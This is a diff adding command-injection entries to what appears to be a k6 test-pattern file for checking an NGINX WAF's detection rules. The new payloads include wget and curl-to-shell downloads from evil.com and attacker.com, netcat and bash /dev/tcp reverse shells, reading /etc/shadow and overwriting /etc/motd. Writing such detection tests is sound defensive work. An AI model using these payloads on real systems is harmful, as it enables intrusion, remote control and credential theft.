@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "cmdinj",
-    "total_patterns": 67,
+    "total_patterns": 79,
     "port": 8004,
     "description": "k6 test patterns for cmdinj"
   },
@@ -809,6 +809,150 @@
       "expected_detection": true,
       "severity": "critical",
       "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
+    },
+    {
+      "id": "CMD_BACK_002",
+      "name": "Malicious download via backticks",
+      "category": "cmdi",
+      "subcategory": "backtick",
+      "payload": "`wget http://evil.com/backdoor`",
+      "encoded": "%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via backtick"
+    },
+    {
+      "id": "CMD_BACK_003",
+      "name": "Reverse shell via backticks",
+      "category": "cmdi",
+      "subcategory": "backtick",
+      "payload": "`nc -l -p 1234 -e /bin/bash`",
+      "encoded": "%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via backtick"
+    },
+    {
+      "id": "CMD_BACK_004",
+      "name": "Remote script execution via backticks",
+      "category": "cmdi",
+      "subcategory": "backtick",
+      "payload": "`curl -s http://attacker.com | sh`",
+      "encoded": "%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via backtick"
+    },
+    {
+      "id": "CMD_BACK_005",
+      "name": "System file modification via backticks",
+      "category": "cmdi",
+      "subcategory": "backtick",
+      "payload": "`echo 'hacked' > /etc/motd`",
+      "encoded": "%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via backtick"
+    },
+    {
+      "id": "CMD_BASH_002",
+      "name": "Bash reverse shell",
+      "category": "cmdi",
+      "subcategory": "bash_specific",
+      "payload": "&& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "encoded": "%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Basic command injection"
+    },
+    {
+      "id": "CMD_BASH_003",
+      "name": "Shell shadow file access",
+      "category": "cmdi",
+      "subcategory": "bash_specific",
+      "payload": "| /bin/sh -c 'cat /etc/shadow'",
+      "encoded": "%7C%20%2Fbin%2Fsh%20-c%20%27cat%20%2Fetc%2Fshadow%27",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Basic command injection"
+    },
+    {
+      "id": "CMD_BASH_004",
+      "name": "Bash TCP shell via exec",
+      "category": "cmdi",
+      "subcategory": "bash_specific",
+      "payload": "; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done",
+      "encoded": "%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Basic command injection"
+    },
+    {
+      "id": "CMD_BASH_005",
+      "name": "Path environment variable access",
+      "category": "cmdi",
+      "subcategory": "bash_specific",
+      "payload": "&& bash -c 'echo $PATH'",
+      "encoded": "%26%26%20bash%20-c%20%27echo%20%24PATH%27",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Basic command injection"
+    },
+    {
+      "id": "CMD_PIPE_002",
+      "name": "Process list piped to grep",
+      "category": "cmdi",
+      "subcategory": "pipe",
+      "payload": "ps aux | grep apache",
+      "encoded": "ps%20aux%20%7C%20grep%20apache",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Command injection via pipe"
+    },
+    {
+      "id": "CMD_PIPE_003",
+      "name": "Network stats piped to grep",
+      "category": "cmdi",
+      "subcategory": "pipe",
+      "payload": "netstat -an | grep LISTEN",
+      "encoded": "netstat%20-an%20%7C%20grep%20LISTEN",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Command injection via pipe"
+    },
+    {
+      "id": "CMD_PIPE_004",
+      "name": "Directory listing piped to head",
+      "category": "cmdi",
+      "subcategory": "pipe",
+      "payload": "ls -la | head -10",
+      "encoded": "ls%20-la%20%7C%20head%20-10",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Command injection via pipe"
+    },
+    {
+      "id": "CMD_PIPE_005",
+      "name": "Config file search and read via pipe",
+      "category": "cmdi",
+      "subcategory": "pipe",
+      "payload": "find / -name '*.conf' | xargs cat",
+      "encoded": "find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat",
+      "port": 8001,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via pipe"
     }
   ]
 }
